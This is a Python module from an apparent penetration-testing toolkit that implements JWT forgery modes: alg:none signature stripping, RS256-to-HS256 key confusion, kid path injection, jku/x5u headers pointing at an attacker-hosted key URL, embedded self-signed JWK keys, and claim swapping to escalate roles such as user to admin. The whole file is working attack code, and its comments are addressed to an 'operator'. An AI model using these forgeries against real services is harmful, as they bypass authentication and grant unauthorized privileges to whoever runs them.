"""JWT forge-mode implementations for forge_jwt (alg-none/HS-confusion/kid/jku/x5u/jwk/claim-swap)."""

from __future__ import annotations

import base64
import re
from typing import Any

from ._jwt_codec import (
    decode_header,
    decode_payload,
    encode_segment,
    generate_rsa_keypair_for_embed,
    sign_hmac,
    sign_rsa,
    split_jwt,
)



_VALID_MODES = (
    "alg_none", "hs_confusion", "kid_inject", "jku", "claim_swap",
    "jwk_embed", "x5u",
)


def _forge_alg_none(token: str, claim_changes: dict[str, Any]) -> tuple[str, str]:
    """alg:none — replace header alg, optionally mutate claims, drop signature.

    The empty trailing dot is required — RFC7519 sec 6.1 says JWS in unsecured
    form is header.payload. but most servers tolerate header.payload. (with
    the trailing dot empty). Both forms are emitted here for the operator to
    pick between.
    """
    header = decode_header(token)
    payload = decode_payload(token)

    forged_header = {**header, "alg": "none", "typ": header.get("typ", "JWT")}
    forged_payload = {**payload, **claim_changes}

    h_b64 = encode_segment(forged_header)
    p_b64 = encode_segment(forged_payload)
    return f"{h_b64}.{p_b64}.", "alg=none"


def _forge_hs_confusion(
    token: str, public_key_pem: str, claim_changes: dict[str, Any],
) -> tuple[str, str]:
    """RS→HS confusion. Use the RSA public key as the HS256 HMAC secret —
    if the server verifies the same key in HMAC mode, the signature passes.
    """
    if not public_key_pem.strip():
        raise ValueError("hs_confusion requires the server's public_key_pem")

    header = decode_header(token)
    payload = decode_payload(token)

    forged_header = {**header, "alg": "HS256", "typ": header.get("typ", "JWT")}
    forged_payload = {**payload, **claim_changes}

    h_b64 = encode_segment(forged_header)
    p_b64 = encode_segment(forged_payload)
    signing_input = f"{h_b64}.{p_b64}".encode()
    # PEM bytes (newlines included) are what most production servers pass to
    # HMAC by mistake — verbatim. Operator can pass the key with whatever
    # canonicalization they captured.
    sig = sign_hmac("HS256", signing_input, public_key_pem.encode())
    from base64 import urlsafe_b64encode
    sig_b64 = urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h_b64}.{p_b64}.{sig_b64}", "alg=HS256 signed with PEM bytes"


def _forge_kid_inject(
    token: str, kid_value: str, hmac_secret: bytes, claim_changes: dict[str, Any],
) -> tuple[str, str]:
    """kid injection — set kid to attacker-known content path, sign with that
    content as the HMAC key. Classic: kid=/dev/null with empty-string secret.
    """
    header = decode_header(token)
    payload = decode_payload(token)

    alg = header.get("alg", "HS256")
    if not alg.upper().startswith("HS"):
        # kid forging only makes sense in HS context — the lookup key IS the
        # HMAC secret. RSA kid lookups need RSA forging instead.
        alg = "HS256"
    forged_header = {**header, "alg": alg, "kid": kid_value,
                     "typ": header.get("typ", "JWT")}
    forged_payload = {**payload, **claim_changes}

    h_b64 = encode_segment(forged_header)
    p_b64 = encode_segment(forged_payload)
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = sign_hmac(alg, signing_input, hmac_secret)
    from base64 import urlsafe_b64encode
    sig_b64 = urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h_b64}.{p_b64}.{sig_b64}", f"alg={alg} kid={kid_value!r}"


def _forge_url_header(
    token: str, header_name: str, attacker_url: str,
    claim_changes: dict[str, Any],
) -> tuple[str, str]:
    """jku / x5u — header points at attacker URL. Server fetches keys from
    there. We attach an unsigned-shape signature (empty) since the actual
    verification will happen with the attacker's hosted JWKS/x509 — operator
    pairs this with `jwk_embed` style forging using the hosted keypair.
    """
    if not attacker_url:
        raise ValueError(f"{header_name} mode requires attacker_url")

    header = decode_header(token)
    payload = decode_payload(token)

    forged_header = {**header, "alg": "RS256", header_name: attacker_url,
                     "typ": header.get("typ", "JWT")}
    forged_payload = {**payload, **claim_changes}

    h_b64 = encode_segment(forged_header)
    p_b64 = encode_segment(forged_payload)
    # Empty signature shape — operator must pair this with a hosted JWKS that
    # publishes a key whose matching private key signs the token. The forge
    # tool can do that combined step via mode=jwk_embed; this mode is for
    # operators who already control a JWKS endpoint.
    return f"{h_b64}.{p_b64}.", f"alg=RS256 {header_name}={attacker_url}"


def _forge_claim_swap(
    token: str, claim_changes: dict[str, Any], hmac_secret: bytes | None,
    use_alg_none: bool,
) -> tuple[str, str]:
    """Re-sign the token with operator-supplied secret OR drop to alg=none.

    Use case: operator already cracked the HS256 secret (via crack_jwt_secret
    or other means) and now wants to flip role:user → role:admin.
    """
    if use_alg_none:
        return _forge_alg_none(token, claim_changes)

    if hmac_secret is None:
        raise ValueError("claim_swap needs either hmac_secret or use_alg_none=True")

    header = decode_header(token)
    payload = decode_payload(token)

    alg = header.get("alg", "HS256")
    if not alg.upper().startswith("HS"):
        # Force HS256 — operator wants to re-sign with a secret, RSA needs a
        # private key path (use jwk_embed mode instead).
        alg = "HS256"
    forged_header = {**header, "alg": alg, "typ": header.get("typ", "JWT")}
    forged_payload = {**payload, **claim_changes}

    h_b64 = encode_segment(forged_header)
    p_b64 = encode_segment(forged_payload)
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = sign_hmac(alg, signing_input, hmac_secret)
    from base64 import urlsafe_b64encode
    sig_b64 = urlsafe_b64encode(sig).rstrip(b"=").decode()
    return f"{h_b64}.{p_b64}.{sig_b64}", f"alg={alg} re-signed"


def _forge_jwk_embed(
    token: str, claim_changes: dict[str, Any],
) -> tuple[str, str, str]:
    """Generate fresh RSA keypair, embed public JWK in header, sign with
    matching private key. Returns (token, note, private_pem) — the operator
    keeps the private PEM out of band (e.g. for the matching jku-hosted JWKS).
    """
    header = decode_header(token)
    payload = decode_payload(token)

    private_pem, jwk_pub = generate_rsa_keypair_for_embed()
    forged_header = {**header, "alg": "RS256", "jwk": jwk_pub,
                     "typ": header.get("typ", "JWT")}
    forged_payload = {**payload, **claim_changes}

    h_b64 = encode_segment(forged_header)
    p_b64 = encode_segment(forged_payload)
    signing_input = f"{h_b64}.{p_b64}".encode()
    sig = sign_rsa("RS256", signing_input, private_pem)
    from base64 import urlsafe_b64encode
    sig_b64 = urlsafe_b64encode(sig).rstrip(b"=").decode()
    return (
        f"{h_b64}.{p_b64}.{sig_b64}",
        "alg=RS256 jwk=embedded self-signed",
        private_pem.decode(),
    )


